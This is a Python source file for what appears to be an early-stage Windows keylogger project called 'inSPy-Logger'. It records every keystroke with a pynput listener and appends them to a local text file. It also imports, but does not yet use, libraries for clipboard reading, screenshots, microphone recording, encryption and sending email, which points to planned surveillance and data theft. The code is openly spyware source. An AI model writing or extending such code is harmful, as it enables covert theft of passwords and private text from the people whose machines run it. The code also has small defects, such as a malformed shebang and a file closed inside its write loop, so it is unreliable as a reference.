#!/usr/bin/env/ python3

# Import libraries

# E-mail libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Standard system libraries to gather info

import socket
import platform

import time
import os

from multiprocessing import Process, freeze_support

# Clipboard library
import win32clipboard

# Keyboard library
from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from PIL import ImageGrab

# Name of the keys file
keys_information = 'key_log.txt'

file_path = 'C:\\Users\\tayja\Documents\\projects\\inSPy-Logger'
extend = '\\'

count = 0
keys = []  # Empty list to append keys to


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0  # Reset counter
        write_file(keys)  # Write keys
        keys = []  # Reset key list


def write_file(keys):
    with open(file_path + extend + keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'", '')
            if k.find('space') > 0:
                f.write('\n')
                f.close()

            elif k.find('Key') == -1:
                f.write(k)
                f.close()



def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()